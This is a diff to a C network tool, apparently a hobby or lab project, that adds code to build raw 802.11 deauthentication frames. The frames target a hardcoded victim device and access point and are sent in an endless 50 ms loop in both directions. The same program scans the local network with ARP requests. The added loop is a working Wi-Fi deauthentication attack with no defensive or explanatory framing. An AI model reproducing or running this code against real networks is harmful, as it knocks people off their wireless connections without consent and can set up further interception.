@@ -1,6 +1,7 @@
 //#define _POSIX_C_SOURCE 200112L
 #include "main.h"
 
+
 #include <errno.h>
 
 #include <curses.h>
@@ -67,27 +68,118 @@ int main(int argc, char* argv[])
   pthread_create(&senderThread, NULL, sendArpRequest, &send_pck);
   pthread_create(&receiverThread, NULL, recvMessage, &mapStr);
 
+  struct ifreq if_idx;
+  struct ifreq if_mac;
+  /* Get the index of the interface to send on */
+  memset(&if_idx, 0, sizeof(struct ifreq));
+  strncpy(if_idx.ifr_name, VIRT_NET, IFNAMSIZ-1);
+  if (ioctl(connFd, SIOCGIFINDEX, &if_idx) < 0)
+      perror("SIOCGIFINDEX");
+  /* Get the MAC address of the interface to send on */
+  memset(&if_mac, 0, sizeof(struct ifreq));
+  strncpy(if_mac.ifr_name, VIRT_NET, IFNAMSIZ-1);
+  if (ioctl(connFd, SIOCGIFHWADDR, &if_mac) < 0)
+      perror("SIOCGIFHWADDR");
+  int sent;
+  int counter = 0;
+  char* buf = (char*)calloc(1024, sizeof(char));
+  int bufSize = 0;
+  wprintw(wins->arp_right->win, "Done\n");
+//  memcpy(buf, "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01\xff\xff\xff\xff\xff\xff\xc8\xd7\x79\xd0\xa2\x81\xc8\xd7\x79\xd0\xa2\x81\x00\x00\x07\x00", 38);
+//  bufSize = 38;
+  struct ieee80211_radiotap_header* radiotap_hdr = (struct ieee80211_radiotap_header*)buf;
+  bufSize += sizeof(struct ieee80211_radiotap_header);
+  radiotap_hdr->it_len = sizeof(struct ieee80211_radiotap_header) + 1;
+  radiotap_hdr->it_present |= RATE;
+  // 1 Mb/s
+  *(buf + bufSize++) = 0x2;
+
+
+
+  struct machdr* macHdr = (struct machdr*)(buf + bufSize);
+  bufSize += sizeof(struct machdr);
+  wprintw(wins->arp_right->win,"size of radiotap %d size of machdr %d Size is %d\n", sizeof(struct ieee80211_radiotap_header), sizeof(struct machdr), bufSize);
+  macHdr->version = 0;
+  macHdr->type = TYPE_MANAGEMENT;
+  macHdr->subtype = SUB_DEAUTH;
+  macHdr->dur_or_ID = htons(0x3a01);
+  uint16_t data = DRC_LEAVING;
+  memcpy(buf + bufSize, (char*)&data, 2);
+  bufSize+=2;
+
+
+  char* victim = "f8:ff:c2:49:88:d7";
+  char* bssid = "dc:39:6f:1d:de:65";
+  mac2UInt8Arr(victim, macHdr->dmac);
+  mac2UInt8Arr(bssid, macHdr->smac);
+  mac2UInt8Arr(bssid, macHdr->bssid);
+
+  char* broad= getBroadcastMac();
+  if(!broad)
+  {
+    printw("No more memory, terminating");
+  }
+  uint8_t  ether_dhost[ETH_ALEN];	/* destination eth addr	*/
+  mac2UInt8Arr(broad, ether_dhost);
+  struct sockaddr_ll socket_address;
+  /* Index of the network device */
+  socket_address.sll_ifindex = if_idx.ifr_ifindex;
+  /* Address length*/
+  socket_address.sll_halen = ETH_ALEN;
+  memcpy(&socket_address.sll_addr, ether_dhost,  ETH_ALEN);
+  FILE* fl = fopen("test", "wb");
+  fwrite(buf, sizeof(char), bufSize, fl);
+  fclose(fl);
+//  wprintw(wins->arp_left->win, "CONTENT: ");
+//  for(int i = 0; i < bufSize; i++)
+//  {
+//    wprintw(wins->arp_left->win, "%hhx ", (*(buf + i)));
+//  }
+
+  while(1)
+  {
+    if((sent = sendto(connFd, buf, bufSize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
+    {
+      wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
+    }
+    else
+    {
+      wprintw(wins->arp_right->win, "Sent deauth, len %d, total %d\n", sent, bufSize);
+    }
+    mac2UInt8Arr(bssid, macHdr->dmac);
+    mac2UInt8Arr(victim, macHdr->smac);
+    if((sent = sendto(connFd, buf, bufSize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
+    {
+      wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
+    }
+    else
+    {
+      wprintw(wins->arp_right->win, "Sent deauth, len %d, total %d\n", sent, bufSize);
+    }
+    mac2UInt8Arr(victim, macHdr->dmac);
+    mac2UInt8Arr(bssid, macHdr->smac);
+//    uint8_t a = *(buf + fcf_pos + 1);
+//    uint8_t b = *(buf + fcf_pos);
+//    if(b == 0xFF) 
+//    {
+//      b = 0x0;
+//      if(a == 0xFF)
+//        break;
+//      a++;
+//      wprintw(wins->arp_right->win, "%x %x\n", a, b);
+//      wrefresh(wins->arp_right->win);
+//      update_panels();
+//    }
+//    else
+//    {
+//      b++;
+//    }
+//    *(buf + fcf_pos) = b;
+//    *(buf + fcf_pos + 1) = a;
+     usleep(50000);
+  }
   pthread_join(receiverThread, 0);
   pthread_join(senderThread, 0);
-//  int sent;
-//  int counter = 0;
-//  wprintw(wins->arp_right->win, "Done\n");
-//  memset(buf, 0, 1024);
-//  bufSize = 0;
-//  struct machdr* macHdr = (struct machdr*)buf;
-//  memcpy(buf, "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01\xff\xff\xff\xff\xff\xff\xc8\xd7\x79\xd0\xa2\x81\xc8\xd7\x79\xd0\xa2\x81\x00\x00\x07\x00", 38);
-//  //bufSize += sizeof(struct machdr);
-////  macHdr->subtype = htons(SUB_DEAUTH);
-//  bufSize = 38;
-//
-//  if((sent = sendto(connFd, buf, bufSize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll))) == -1)
-//  {
-//    wprintw(wins->arp_right->win, "Sent %d bytes %s\n", sent,  strerror(errno));
-//  }
-//  else
-//  {
-//    wprintw(wins->arp_right->win, "Sent deauth, len %d\n", sent);
-//  }
   
   endwin();
   return 0;
@@ -394,6 +486,7 @@ void* sendArpRequest(void* param)
   memcpy(&socket_address.sll_addr, ethHdr->ether_dhost, ETH_ALEN);
   struct in_addr currAddr = startAddr;
 
+  getch();
   wprintw(wins->arp_right->win, "[+] Scanning network\n");
   do {
     bufSize = sizeof(struct ether_header) + sizeof(struct arphdr);
